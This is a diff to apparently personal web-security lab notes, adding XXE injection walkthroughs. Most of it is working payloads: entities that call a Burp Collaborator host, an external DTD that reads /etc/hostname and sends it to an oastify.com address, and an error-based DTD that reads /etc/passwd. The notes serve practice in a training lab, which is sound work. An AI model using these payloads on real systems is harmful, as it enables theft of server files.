@@ -1431,25 +1431,34 @@ Interfere with an application's processing of XML to view files on the applicati
      <text font-size="16" x="0" y="16">&xxe;</text>
    </svg>
    ``` 
-- Blind XXE with out-of-band interaction
-  xxe SYSTEM "http://burp"
+- Blind XXE with out-of-band interaction   
+ **xxe SYSTEM "http://burp"**   
   `<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>`
-- Blind XXE with out-of-band interaction via **XML parameter entities**
-  % xxe SYSTEM "http://burp"
+- Blind XXE with out-of-band interaction via **XML parameter entities**    
+  **% xxe SYSTEM "http://burp"**   
   `<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>`
-- Exploiting blind XXE to exfiltrate data using a malicious external DTD
-   - Store DTD payload   
+- Exploiting blind XXE to exfiltrate data using a **malicious external DTD**
+   - Go to exploit server > insert below malicious DTD > click store button   
      ```
      <!ENTITY % file SYSTEM "file:///etc/hostname">
       <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://6mtezovlmkll41l5iasruysosfy6mxjl8.oastify.com/?x=%file;'>">
       %eval;
       %exfil;
       ```
-   - exploit server > insert dtd body payload > click store button
-   - Repeater modified   
+   - Check Stock repeater modify the body param   
      `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0ac8008703c35d7d8048bbea01cf0088.exploit-server.net/exploit"> %xxe;]>`
-   - Collaborator Poll Now > GET /?x=**ddd7bfff53e5** HTTP/1.1
-- ddd
+   - Collaborator Poll Now > GET /?x=**ddd7bfff53e5**   
+- Exploiting blind XXE to retrieve data via **error messages**
+  - Go to exploit server > insert below malicious DTD > click store button   
+    ```
+    <!ENTITY % file SYSTEM "file:///etc/passwd">
+    <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
+     %eval;
+     %exfil;
+    ```
+  - Click "View exploit" > note the exploit URL
+  - Check Stock repeater modify the body param   
+    `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>`
 - ddd
 
 ## API
